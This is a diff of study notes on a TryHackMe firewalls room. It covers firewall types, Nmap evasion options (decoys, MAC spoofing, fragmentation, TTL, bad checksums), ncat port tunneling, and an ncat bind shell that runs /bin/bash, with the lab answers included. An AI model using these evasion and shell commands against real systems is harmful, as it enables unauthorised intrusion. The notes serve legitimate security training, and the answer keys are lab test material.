@@ -13,7 +13,6 @@ Before we go into more details about firewalls, it is helpful to remember the co
     Source Address
     Destination Address
 
-
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/09d8061f603e6ba8e65a185dc4a2d417.png)
 
 Depending on the protocol field, the data in the IP datagram can be one of many options. Three common protocols are:
@@ -44,14 +43,11 @@ This room requires the user to have basic knowledge of:
     Network and port scanning. We suggest you complete the Nmap module to learn more about this topic.
     Reverse and bind shells. We recommend the What the Shell? room to learn more about shells.
 
-
-
 The design logic of traditional firewalls is that a port number would identify the service and the protocol. For instance, visit Service Name and Transport Protocol Port Number Registry to answer the following questions.
 http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml
 
 If you want to block telnet, which TCP port number would you deny?
 *23*
-![[Pasted image 20220910204941.png]]
 
 You want to allow HTTPS, which TCP port number do you need to permit?
 *443*
@@ -87,8 +83,6 @@ Based on firewall abilities, we can list the following firewall types:
     Proxy Firewall: A proxy firewall is also referred to as Application Firewall (AF) and Web Application Firewall (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols.
     Next-Generation Firewall (NGFW): NGFW offers the highest firewall protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7. It has application awareness and control. Examples include the Juniper SRX series and Cisco Firepower.
     Cloud Firewall or Firewall as a Service (FWaaS): FWaaS replaces a hardware firewall in a cloud environment. Its features might be comparable to NGFW, depending on the service provider; however, it benefits from the scalability of cloud architecture. One example is Cloudflare Magic Firewall, which is a network-level firewall. Another example is Juniper vSRX; it has the same features as an NGFW but is deployed in the cloud. It is also worth mentioning AWS WAF for web application protection and AWS Shield for DDoS protection.
-
-
 
 What is the most basic type of firewall?
 *Packet-Filtering Firewall*
@@ -127,8 +121,6 @@ We can dive into all the details embedded into each packet; however, for this ex
 
 In the following sections and tasks, we will see how Nmap provides various options to evade the firewall and other network security solutions.
 
-
-
 What is the size of the IP packet when using a default Nmap stealth (SYN) scan?
 (Add the IP header size to the TCP header size.)
 *44*
@@ -165,8 +157,6 @@ Spoofed MAC Address
 
 Spoof the source MAC address. Nmap allows you to spoof your MAC address using the option --spoof-mac MAC_ADDRESS. This technique is tricky; spoofing the MAC address works only if your system is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If you are not on the same network segment, sharing the same Ethernet, you won’t be able to capture and read the responses. It allows you to exploit any trust relationship based on MAC addresses. Moreover, you can use this technique to hide your scanning activities on the network. For example, you can make your scans appear as if coming from a network printer.
 
-![[Pasted image 20220910210830.png]]
-
 What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, 00:02:DC? (Requires research. You may use a website that looks up MAC addresses. Some sites return "Limited" instead of "Ltd"; please use Ltd instead of Limited.)
 *Fujitsu General Ltd*
 
@@ -202,14 +192,11 @@ Use a specific source port number 	-g PORT_NUM or --source-port PORT_NUM
 
 ### Evasion via Forcing Fragmentation, MTU, and Data Length 
 
-
-
 You can control the packet size as it allows you to:
 
     Fragment packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it.
     Send packets with specific data lengths.
 Maximum Transmission Unit 
-
 
 Fragment Your Packets with 8 Bytes of Data
 
@@ -220,7 +207,6 @@ One easy way to fragment your packets would be to use the -f option. This option
 What is the size of the IP packet when running Nmap with the -f option? )(You need to add the IP header size to the data fragment.)
 *28*
 
-
 Fragment Your Packets with 16 Bytes of Data
 
 Another handy option is the -ff, limiting the IP data to 16 bytes. (One easy way to remember this is that one f is 8 bytes, but two fs are 16 bytes.) By running nmap -sS -Pn -ff -F MACHINE_IP, we expect the 24 bytes of the TCP header to be divided between two IP packets, 16 + 8, because -ff has put an upper limit of 16 bytes. The first few packets are shown in the Wireshark capture below.
@@ -230,7 +216,6 @@ Another handy option is the -ff, limiting the IP data to 16 bytes. (One easy way
 What is the maximum size of the IP packet when running Nmap with the -ff option? (You need to add the IP header size to the maximum size of the data fragment.)
 
 *36*
-
 
 Fragment Your Packets According to a Set MTU
 
@@ -260,8 +245,6 @@ You need to add the IP header size to the size of the data fragment.
 
 *148*
 
-
-
 This is a quick summary of the Nmap options discussed in this task.
 Evasion Approach 	Nmap Argument
 Fragment IP data into 8 bytes 	-f
@@ -285,10 +268,7 @@ In the following screenshot, we can see the packets captured by Wireshark after 
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f98efaf6faf449bf6cc2787baa581e31.png)
 
-
-
 Start the AttackBox and the machine attached to this task. After you give them time to load fully, scan the attached MS Windows machine using --ttl 1 option. Check the number of ports that appear to be open. The answer will vary depending on whether you are using the AttackBox or connecting over VPN. We suggest you try both.
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -342,7 +322,6 @@ All 100 scanned ports on MACHINE_IP are filtered
 Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
 
         
-
 
 ```
 
@@ -408,7 +387,6 @@ Ncat: Listening on 0.0.0.0:1025
 
         
 
-
 ```
 
 We want to test if the target machine can connect to the AttackBox on TCP port 1025. By browsing to http://10.10.23.152:8080, you will be faced with a web page that lets you execute commands on the target machine. Note that in a real-case scenario, you might be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code of your choice.
@@ -429,10 +407,7 @@ Ncat: Connection from 10.10.30.130:51292.
 
         
 
-
 ```
-
-
 
 Using this simple technique, discover which port number of the following destination TCP port numbers are reachable from the protected system.
 
@@ -451,7 +426,6 @@ listening on [any] 21 ...
 connect to [10.11.81.220] from (UNKNOWN) [10.10.23.152] 53434
 
 ```
-![[Pasted image 20220910213329.png]]
 
 *21*
 
@@ -475,8 +449,6 @@ The command ncat uses the following options:
 As a result, ncat will listen on port 443, but it will forward all packets to port 25 on the target server. Because in this case, the firewall is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade the firewall.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ef6b903dbb6c4eb20051f9ddd5b9fa8f.png)
-
-
 
 We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We’re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag.
 
@@ -506,10 +478,7 @@ GET /
 
 ![](https://www.cyb3rm3.com/web/image/1299-33cb6d2e/2022-02-26%2015_09_37-TryHackMe%20_%20Firewalls.png)
 
-
 ### Evasion Using Non-Standard Ports 
-
-
 
 ncat -lvnp PORT_NUMBER -e /bin/bash will create a backdoor via the specified port number that lets you interact with the Bash shell.
 
@@ -520,8 +489,6 @@ On the AttackBox, we can run ncat 10.10.23.152 PORT_NUMBER to connect to the tar
 
 Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. Moreover, unless we run ncat as a privileged user, root, or using sudo, we cannot use port numbers below 1024.
 
-![[Pasted image 20220910215752.png]]
-
 ```
 root@ip-10-10-237-131:~# ncat 10.10.23.152 8081
 whoami
@@ -529,15 +496,12 @@ thmredteam
 
 ```
 
-
 We’re continuing to use the web-form from Task 6 to set up the ncat listener. Knowing that the firewall does not block packets to destination port 8081, use ncat to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in?
 
 Run whoami to find the username.
 *thmredteam*
 
 ### Next-Generation Firewalls 
-
-
 
 Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS.
 
@@ -550,8 +514,6 @@ Next-Generation Firewall (NGFW) is designed to handle the new challenges facing 
     Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files.
 
 A properly configured and deployed NGFW renders many attacks useless.
-
-
 
 What is the number of the highest OSI layer that an NGFW can process?
 *7*
@@ -575,9 +537,7 @@ Set IP time-to-live field 	--ttl VALUE
 Send packets with specified IP options 	--ip-options OPTIONS
 Send packets with a wrong TCP/UDP checksum 	--badsum
 
-
 Ensure you have gained a solid understanding of the technologies and techniques presented in this room.
-
 
 [[Enumeration]]
 
